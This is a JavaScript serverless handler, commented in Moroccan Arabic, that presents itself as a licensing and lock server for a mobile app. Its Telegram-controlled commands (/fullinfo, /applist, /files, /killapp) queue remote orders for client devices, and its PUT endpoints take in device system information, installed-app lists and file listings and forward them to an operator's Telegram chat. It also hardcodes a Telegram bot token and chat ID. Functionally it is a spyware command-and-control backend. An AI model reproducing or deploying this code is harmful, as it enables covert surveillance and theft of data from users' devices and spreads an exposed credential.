const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let appLockStatus = "lock";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let banAllActive = false;
let remoteCommand = "";
let totalAttempts = 0;
let recentLogs = [];

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    // 1. المفتاح الوحيد (Authentication)
    if (type === 'auth') {
      const userKey = req.query.key;
      const deviceId = req.query.device_id;
      if (!userKey || !deviceId) return res.status(400).send('"No Key or ID"');
      
      const isValid = await kvCmd('SISMEMBER', 'valid_keys', userKey);
      if (isValid === 1) {
        await kvCmd('SREM', 'valid_keys', userKey); // يتحيد المفتاح (مرة وحدة)
        await kvCmd('SET', `unlock_time_${deviceId}`, Date.now().toString());
        return res.status(200).send('"success"');
      } else {
        return res.status(200).send('"failed"');
      }
    }

    // 2. فحص الوقت (Secret)
    if (type === 'secret') {
      const deviceId = req.query.device_id;
      if (deviceId) {
        const unlockTimeStr = await kvCmd('GET', `unlock_time_${deviceId}`);
        if (unlockTimeStr) {
          const validity = parseFloat(await kvCmd('GET', 'key_validity_hours')) || 1;
          const elapsed = Date.now() - parseInt(unlockTimeStr);
          
          if (elapsed > validity * 3600000) {
            await kvCmd('DEL', `unlock_time_${deviceId}`);
            return res.status(200).send('"killapp"'); // الوقت سلا، كنقتلو التطبيق
          }
          return res.status(200).send('"unlock"');
        }
      }
      return res.status(200).send(`"${appLockStatus}"`);
    }

    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') banAllActive = true;
      if (banAllActive) return res.status(200).send('"true"');
      const deviceId = req.query.device_id;
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      if (inKv === 1) return res.status(200).send('"true"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, '');
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop();
            await kvCmd('INCR', 'total_attempts');
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          if (type === 'sysinfo') {
             await sendToTelegram(`💻 *معلومات:*\n${cleanBody}`);
          }
          if (type === 'applist') {
             await sendToTelegram(`📱 *التطبيقات:*\n${cleanBody}`);
          }
          if (type === 'files') {
             await sendToTelegram(`📁 *الملفات:*\n${cleanBody}`);
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      const mainKeyboard = {
        inline_keyboard: [
          [{ text: "🔒 قفل", callback_data: "/lock" }, { text: "🔓 فتح", callback_data: "/unlock" }],
          [{ text: "🔑 توليد مفتاح", callback_data: "/genkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
          [{ text: "📱 معلومات", callback_data: "/fullinfo" }, { text: "📦 التطبيقات", callback_data: "/applist" }],
          [{ text: "📁 الملفات", callback_data: "/files" }, { text: "💀 إغلاق التطبيق", callback_data: "/killapp" }]
        ]
      };

      if (text === '/start' || text === '/menu') {
        await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nاختر من القائمة.", mainKeyboard);
        return res.status(200).end();
      }

      switch (command) {
        case '/help': 
          await sendToTelegram(`👑 *الأوامر:*\n/settime [ساعات] - تحديد وقت المفتاح\n/genkey - توليد مفتاح مرة وحدة\n/killapp /fullinfo /applist /files /lock /unlock`); 
          break;
        
        case '/settime':
          if (args[1]) {
            await kvCmd('SET', 'key_validity_hours', args[1].toString());
            await sendToTelegram(`⏱️ *تم تحديد وقت المفتاح:* \`${args[1]}\` ساعات.`);
          } else {
            await sendToTelegram("⚠️ `/settime 2`");
          }
          break;

        case '/genkey':
          const newK = Math.random().toString(36).substring(2, 8).toUpperCase();
          await kvCmd('SADD', 'valid_keys', newK);
          const vH = await kvCmd('GET', 'key_validity_hours') || 1;
          await sendToTelegram(`🎲 *مفتاح جديد (مرة وحدة):* \`${newK}\`\n⏱️ *صالح لـ:* \`${vH}\` ساعات.`);
          break;
          
        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 *إغلاق التطبيق...*"); break;
        case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ *جاري سحب المعلومات...*"); break;
        case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ *جاري سحب التطبيقات...*"); break;
        case '/files': remoteCommand = "files:1"; await sendToTelegram("⏳ *جاري سحب الملفات...*"); break;
        
        case '/lock': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 *تم القفل.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 *تم الفتح.*"); break;
        
        default: await sendToTelegram("❓ أمر غير معروف.");
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
